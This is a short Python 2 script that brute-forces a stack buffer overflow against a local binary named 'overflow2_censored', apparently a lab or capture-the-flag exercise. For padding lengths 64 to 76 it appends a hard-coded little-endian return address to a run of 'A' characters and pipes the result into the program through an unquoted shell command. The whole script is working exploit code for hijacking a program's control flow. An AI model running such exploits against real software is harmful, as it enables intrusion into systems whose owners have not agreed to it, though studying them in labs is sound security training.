#! /usr/bin/python

import os
import socket
import time

for i in range(64, 77):
  print 'i = ' + str(i)
  string = 'A' * i + '\xb4\x84\x04\x08'
  print string
  os.system('printf ' + string + ' | ./overflow2_censored')
  print '\n'
  time.sleep(0.1)

